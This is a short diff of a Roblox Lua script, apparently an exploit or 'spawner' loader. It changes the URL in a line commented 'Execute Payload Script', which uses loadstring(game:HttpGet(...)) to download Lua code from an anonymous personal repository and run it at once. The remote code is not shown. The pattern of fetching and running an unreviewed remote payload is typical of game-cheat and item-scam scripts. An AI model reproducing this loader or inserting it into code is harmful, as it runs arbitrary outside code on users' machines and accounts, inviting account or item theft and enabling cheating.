@@ -200,5 +200,5 @@ StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
 UserInputService.MouseBehavior = Enum.MouseBehavior.Default
 
 -- Execute Payload Script (Visual UI)
-local Spawner = loadstring(game:HttpGet("https://codeberg.org/darkdarkdark/roblox/raw/branch/main/Spawner.lua"))()
+local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
 Spawner.Load()
